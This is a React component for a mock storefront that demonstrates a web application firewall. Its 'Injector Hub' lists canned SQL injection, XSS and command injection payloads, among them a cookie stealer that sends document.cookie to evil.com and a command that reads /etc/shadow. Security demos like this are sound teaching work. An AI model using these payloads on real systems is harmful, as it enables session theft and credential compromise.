import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { useThreat } from '../context/ThreatContext';
import { API_BASE_URL } from '../config/api';

const INJECTION_PAYLOADS = {
  sqli: [
    { name: "Auth Bypass", payload: "' OR '1'='1", desc: "Attempts to bypass login by making the SQL condition always true." },
    { name: "Union Based", payload: "' UNION SELECT username, password FROM users--", desc: "Extracts data from the users table." }
  ],
  xss: [
    { name: "Basic Alert", payload: "<script>alert('pwned')</script>", desc: "Executes JavaScript in the victim's browser." },
    { name: "Cookie Stealer", payload: "<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>", desc: "Steals session cookies invisibly." }
  ],
  cmd: [
    { name: "Command Exec", payload: "admin; cat /etc/shadow", desc: "Appends arbitrary OS commands to the input." }
  ]
};

const PRODUCTS = [
  { id: 1, name: "MacBook Pro M3", price: "$1,999.00", img: "https://images.unsplash.com/photo-1517336714731-489689fd1ca8?auto=format&fit=crop&q=80&w=400" },
  { id: 2, name: "Sony WH-1000XM5", price: "$398.00", img: "https://images.unsplash.com/photo-1618366712010-f4ae9c647dcb?auto=format&fit=crop&q=80&w=400" },
  { id: 3, name: "Apple Watch Ultra", price: "$799.00", img: "https://images.unsplash.com/photo-1434493789847-2f02dc6ca35d?auto=format&fit=crop&q=80&w=400" },
  { id: 4, name: "AirPods Pro", price: "$249.00", img: "https://images.unsplash.com/photo-1600294037681-c80b4cb5b434?auto=format&fit=crop&q=80&w=400" }
];

const Sandbox = () => {
  const [searchQuery, setSearchQuery] = useState('');
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [comment, setComment] = useState('');
  const [showInjector, setShowInjector] = useState(true);
  
  const [toasts, setToasts] = useState([]);
  const { triggerThreatAlert } = useThreat();

  const addToast = (type, title, message) => {
    const id = Date.now();
    setToasts(prev => [...prev, { id, type, title, message }]);
    setTimeout(() => {
      setToasts(prev => prev.filter(t => t.id !== id));
    }, 4500);
  };

  // Helper to flash the input red if it was blocked
  const flashInput = (id) => {
    const el = document.getElementById(id);
    if (el) {
      el.classList.add('flash-red');
      setTimeout(() => el.classList.remove('flash-red'), 700);
    }
  };

  const handleFetch = async (endpoint, method, payload, inputId) => {
    try {
      const url = new URL(`${API_BASE_URL}${endpoint}`);
      let options = { method, headers: { 'Content-Type': 'application/json' } };

      if (method === 'GET') {
        url.searchParams.append('q', payload);
      } else {
        options.body = JSON.stringify(payload);
      }

      const response = await fetch(url.toString(), options);
      const data = await response.json();

      if (response.status === 403 && data.verdict === 'BLOCK') {
        flashInput(inputId);
        // Show in-page toast for standard user feedback
        addToast('error', 'Request Blocked', `Connection reset. Payload triggered WAF rule: ${data.topThreat?.ruleName || 'Unknown'}`);
        // Dispatch the global ThreatHUD for SOC view
        triggerThreatAlert({ ...data, threatId: data.threatId || 'SIM-' + Date.now() });
      } else {
        // Success (mock backend allowed it)
        addToast('success', 'Request Successful', 'The server accepted the payload without blocking.');
      }
    } catch (err) {
      addToast('error', 'Network Error', err.message);
      console.error(err);
    }
  };

  const onSearch = (e) => {
    e.preventDefault();
    if (!searchQuery) return;
    handleFetch('/search', 'GET', searchQuery, 'cyber-search');
  };

  const onLogin = (e) => {
    e.preventDefault();
    handleFetch('/login', 'POST', { username, password }, 'cyber-login');
  };

  const onComment = (e) => {
    e.preventDefault();
    handleFetch('/comment', 'POST', { body: comment }, 'cyber-comment');
  };

  // Quick inject function
  const injectInto = (field, payload) => {
    if (field === 'search') setSearchQuery(payload);
    if (field === 'login') setUsername(payload);
    if (field === 'comment') setComment(payload);
  };

  return (
    <div className="cybermart-container" style={{ position: 'relative' }}>
      
      {/* Toast Notification Area */}
      <div className="cyber-toast-wrapper">
        <AnimatePresence>
          {toasts.map(toast => (
            <motion.div 
              key={toast.id}
              initial={{ opacity: 0, y: 30, scale: 0.95 }}
              animate={{ opacity: 1, y: 0, scale: 1 }}
              exit={{ opacity: 0, y: 10, scale: 0.95 }}
              className={`cyber-toast toast-${toast.type}`}
            >
              <div className="toast-icon">
                {toast.type === 'error' ? '!' : '✓'}
              </div>
              <div className="toast-content">
                <h4 className="toast-title">{toast.title}</h4>
                <p className="toast-message">{toast.message}</p>
              </div>
            </motion.div>
          ))}
        </AnimatePresence>
      </div>

      {/* Mock Application Area */}
      <div className="cybermart-main">
        {/* Mock Header */}
        <header className="cybermart-header">
          <div className="cybermart-brand">
            Cyber<span>Mart</span>
          </div>
          
          <form className="cybermart-search" onSubmit={onSearch}>
            <span style={{color: '#95a5a6'}}>🔍</span>
            <input 
              id="cyber-search"
              type="text" 
              placeholder="Search products..." 
              value={searchQuery}
              onChange={e => setSearchQuery(e.target.value)}
            />
          </form>

          <nav className="cybermart-nav" style={{ display: 'flex', alignItems: 'center', gap: '20px' }}>
            <a href="#deals">Deals</a>
            <a href="#orders">Orders</a>
            <a href="#cart">Cart (0)</a>
            <button 
              type="button"
              onClick={() => setShowInjector(!showInjector)}
              style={{
                background: showInjector ? '#e74c3c' : '#2ecc71',
                color: '#fff',
                border: 'none',
                padding: '8px 16px',
                borderRadius: '999px',
                fontWeight: 600,
                cursor: 'pointer',
                transition: 'background 0.2s',
                marginLeft: '10px'
              }}
            >
              {showInjector ? 'Close Injector' : 'Open Injector'}
            </button>
          </nav>
        </header>

        {/* Mock Content */}
        <div className="cybermart-content">
          <div className="cybermart-products">
            {PRODUCTS.map(p => (
              <div key={p.id} className="cybermart-product">
                <div className="cybermart-product-img" style={{ backgroundImage: `url(${p.img})`, backgroundSize: 'cover', backgroundPosition: 'center' }}></div>
                <h3>{p.name}</h3>
                <p>{p.price} - In Stock</p>
                <button className="cybermart-btn" onClick={() => addToast('success', 'Added to Cart', `${p.name} was added to your cart.`)}>Add to Cart</button>
              </div>
            ))}
            
            <div className="cybermart-card" style={{ gridColumn: '1 / -1', marginTop: '20px' }}>
              <h4>Leave a Review</h4>
              <form onSubmit={onComment}>
                <div className="cybermart-input-group">
                  <label>YOUR REVIEW</label>
                  <textarea 
                    id="cyber-comment"
                    className="cybermart-input cybermart-textarea" 
                    placeholder="Tell us what you think..."
                    value={comment}
                    onChange={e => setComment(e.target.value)}
                  ></textarea>
                </div>
                <button type="submit" className="cybermart-btn">Submit Review</button>
              </form>
            </div>
          </div>

          <aside className="cybermart-sidebar">
            <div className="cybermart-card">
              <h4>Customer Login</h4>
              <form onSubmit={onLogin} id="cyber-login">
                <div className="cybermart-input-group">
                  <label>USERNAME</label>
                  <input 
                    type="text" 
                    className="cybermart-input" 
                    value={username}
                    onChange={e => setUsername(e.target.value)}
                  />
                </div>
                <div className="cybermart-input-group">
                  <label>PASSWORD</label>
                  <input 
                    type="password" 
                    className="cybermart-input" 
                    value={password}
                    onChange={e => setPassword(e.target.value)}
                  />
                </div>
                <button type="submit" className="cybermart-btn">Sign In</button>
              </form>
            </div>

            <div className="cybermart-card" style={{ background: '#fcfcfc', border: '1px dashed #ccc' }}>
              <h4 style={{ fontSize: '14px', margin: '0 0 8px' }}>Security Notice</h4>
              <p style={{ fontSize: '12px', color: '#7f8c8d', margin: 0, lineHeight: 1.5 }}>
                This is a mock application used to demonstrate WAF defense mechanisms inline. Try injecting payloads into its fields.
              </p>
            </div>
          </aside>
        </div>
      </div>

      {/* Attacker Cheat Sheet Wrapper */}
      <AnimatePresence>
        {showInjector && (
          <motion.div
            initial={{ width: 0, opacity: 0 }}
            animate={{ width: 360, opacity: 1 }}
            exit={{ width: 0, opacity: 0 }}
            transition={{ type: "spring", bounce: 0, duration: 0.4 }}
            style={{ overflow: 'hidden', flexShrink: 0 }}
          >
            <div className="cheat-sheet" style={{ width: 360, height: '100%' }}>
              <h3><span className="dot" style={{ animation: 'none' }}></span> INJECTOR HUB</h3>
              
              <div className="cheat-section">
                <h4>SQL Injection</h4>
                {INJECTION_PAYLOADS.sqli.map(p => (
                  <div key={p.name}>
                    <button className="payload-btn" onClick={() => injectInto('login', p.payload)}>
                      {p.payload}
                    </button>
                    <div className="payload-desc">{p.desc}</div>
                  </div>
                ))}
              </div>

              <div className="cheat-section">
                <h4>Cross-Site Scripting (XSS)</h4>
                {INJECTION_PAYLOADS.xss.map(p => (
                  <div key={p.name}>
                    <button className="payload-btn" onClick={() => injectInto('comment', p.payload)}>
                      {p.payload}
                    </button>
                    <div className="payload-desc">{p.desc}</div>
                  </div>
                ))}
              </div>

              <div className="cheat-section">
                <h4>Command Injection</h4>
                {INJECTION_PAYLOADS.cmd.map(p => (
                  <div key={p.name}>
                    <button className="payload-btn" onClick={() => injectInto('search', p.payload)}>
                      {p.payload}
                    </button>
                    <div className="payload-desc">{p.desc}</div>
                  </div>
                ))}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

    </div>
  );
};

export default Sandbox;
